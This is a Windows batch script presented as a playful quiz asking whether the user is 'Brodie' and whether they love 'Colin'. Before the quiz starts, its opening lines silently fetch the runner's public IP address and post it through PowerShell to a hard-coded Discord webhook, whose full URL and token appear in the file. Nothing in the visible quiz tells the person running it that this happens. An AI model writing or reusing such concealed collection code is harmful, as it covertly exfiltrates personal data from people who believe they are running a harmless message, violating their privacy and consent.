@echo off

REM Get public IP address
for /f "tokens=2 delims=: " %%i in ('nslookup myip.opendns.com resolver1.opendns.com 2^>nul ^| findstr /C:"Address"') do set IP=%%i

REM Prepare JSON payload for IP address
set "json_ip={\"content\":\"Current IP Address: %IP%\"}"

REM Send IP address payload to Discord webhook
powershell -Command "(Invoke-WebRequest -Uri 'https://discord.com/api/webhooks/1226604635637415997/9AUL9pHcXZlCpqGoH-SCRhJrHgEnIoBfSEFwTYwe9u8gg72d4ZMgU_fr8fcq735QzuqJ' -Method Post -Body '%json_ip%' -ContentType 'application/json').Content"

REM Brodie and Colin interaction
setlocal enabledelayedexpansion

set /p brodie="Are you Brodie? (yes/no): "
if /i "%brodie%"=="yes" (
    set /p us="Are you from the US? (yes/no): "
    if /i "%us%"=="yes" (
        set /p love="Do you love Colin more than he loves you? (yes/no): "
        :loop
        if /i "%love%"=="yes" (
            echo I love you more though.
            goto end
        ) else if /i "%love%"=="no" (
            echo I love you so much.
            goto end
        ) else (
            echo Invalid input. Please enter 'yes' or 'no'.
            set /p love="Do you love Colin more than he loves you? (yes/no): "
            goto loop
        )
    ) else if /i "%us%"=="no" (
        goto nextquestion
    ) else (
        echo Invalid input. Please enter 'yes' or 'no'.
        set /p us="Are you from the US? (yes/no): "
        if /i "!us!"=="no" goto nextquestion
    )
) else (
    echo Goodbye!
    goto end
)

:nextquestion
set /p love="Do you love Colin more than he loves you? (yes/no): "
goto loop

:end
pause
